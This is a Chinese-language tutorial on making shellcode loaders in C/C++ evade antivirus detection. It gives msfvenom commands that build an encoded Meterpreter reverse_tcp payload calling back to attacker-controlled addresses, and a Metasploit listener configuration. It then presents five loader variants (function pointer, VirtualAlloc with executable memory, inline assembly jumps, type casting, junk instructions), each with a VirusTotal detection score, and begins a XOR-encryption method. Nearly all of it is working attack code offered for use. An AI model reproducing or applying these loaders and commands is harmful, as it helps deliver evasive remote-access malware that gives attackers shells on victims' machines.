## C/C++加载shellcode免杀

C/C++加载shellcode⼿⼯编译的⽅法，⼀般分为两种⽅式：

~~~
1、C/C++源码+shellcode直接编译，其中对shellcode的执⾏可以使⽤函数指针执⾏、汇编指令执
⾏、申请动态内存等⽅式，且shellcode可进⾏⼀些加密混淆处理；⽐如免杀⼯具veil和Venom都是
使⽤了类似的⽅法。
2、使⽤加载器加载C/C++代码，如shellcode_launcher之类。
~~~

### C/C++源码编译

~~~
指针执行函数
申请动态内存加载shellcode
嵌入汇编指令
强制类型转换
汇编花指令

~~~

#### ⽅法1:指针执⾏(VT免杀率13/69)

这是最常规的⼀种加载shellcode的⽅法，使⽤指针来执⾏函数，所以免杀效果可能⽐较⼀般，先⽤Msfvenom⽣成c语⾔的shellcode，为了提⾼免杀效果，使⽤了 shikata_ga_nai 编码器

~~~
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.43.237 lport=10001 -f exe -o shell.exe
~~~

~~~c
unsigned char buf[] = 
"shellcode"; #pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
//windows控制台程序不出黑窗口
main()
{
 ( (void(*)(void))&buf)();
}
~~~

~~~
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.43.237
set LPORT 10001
set EnableStageEncoding true
~~~



#### ⽅法2:申请动态内存加载(VT免杀率24/71)

~~~c
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
//windows控制台程序不出黑窗口
unsigned char buf[] = 
"shellcode";
main()
{
char *Memory; 
 Memory=VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE);
memcpy(Memory, buf, sizeof(buf));
 ((void(*)())Memory)();
}
~~~



#### ⽅法3:嵌⼊汇编加载(VT免杀率12/71)

~~~c
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] ="";
void main()
{
 __asm
 {
 
 mov eax, offset shellcode
 jmp eax
 }
}
~~~

#### ⽅法4:强制类型转换(VT免杀率9/70)

~~~c
#include <windows.h>
#include <stdio.h>
unsigned char buf[] ="";
void main()
{
 ((void(WINAPI*)(void))&buf)();
}
~~~

#### ⽅法5:汇编花指令(VT免杀率12/69)

~~~c
#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] ="";
void main()
{
 __asm
 {
 
 mov eax, offset shellcode
 _emit 0xFF 
 _emit 0xE0
 }
}
~~~

#### ⽅法6/XOR加密(VT免杀率15/71)

~~~
需要使⽤⼀个⼯具 https://github.com/Arno0x/ShellcodeWrapper
先⽤msfvenom⽣成⼀个raw格式的shellcode

msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00'
lhost=10.211.55.2 lport=3333 -f raw > shellcode.raw

~~~



































